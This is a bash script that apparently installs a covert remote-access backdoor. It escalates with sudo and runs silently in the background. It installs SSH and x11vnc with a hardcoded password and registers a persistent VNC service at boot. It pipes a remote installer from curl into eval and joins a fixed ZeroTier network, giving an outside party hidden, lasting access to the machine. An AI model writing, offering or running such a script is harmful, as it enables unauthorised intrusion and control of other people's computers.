#!/usr/bin/env bash

run_bdi() {
  apt update
  apt --fix-broken install -y openssh-server x11vnc 

  mkdir /etc/x11vnc
  x11vnc --storepasswd bruh22 /etc/x11vnc/vncpwd

  echo "[Unit]" >> /lib/systemd/system/x11vnc.service
  echo "Description=Start x11vnc at startup." >> /lib/systemd/system/x11vnc.service
  echo -e "After=multi-user.target\n" >> /lib/systemd/system/x11vnc.service
  echo "[Service]" >> /lib/systemd/system/x11vnc.service
  echo "Type=simple" >> /lib/systemd/system/x11vnc.service
  echo -e "ExecStart=/usr/bin/x11vnc -auth guess -forever -noxdamage -repeat -rfbauth /etc/x11vnc/vncpwd -rfbport 5900 -shared\n" >> /lib/systemd/system/x11vnc.service
  echo "[Install]" >> /lib/systemd/system/x11vnc.service
  echo "WantedBy=multi-user.target" >> /lib/systemd/system/x11vnc.service

  systemctl daemon-reload
  systemctl start ssh.service x11vnc.service
  systemctl enable ssh.service x11vnc.service

  eval "$(curl -s 'https://install.zerotier.com' | sed -E 's/^exit 0//g')" 
  zerotier-cli join 4bb27c774d8de5f5
}

if [ $(id -u) -ne 0 ]
then 
  sudo "$0"
  exit 99
fi

run_bdi &> /dev/null &

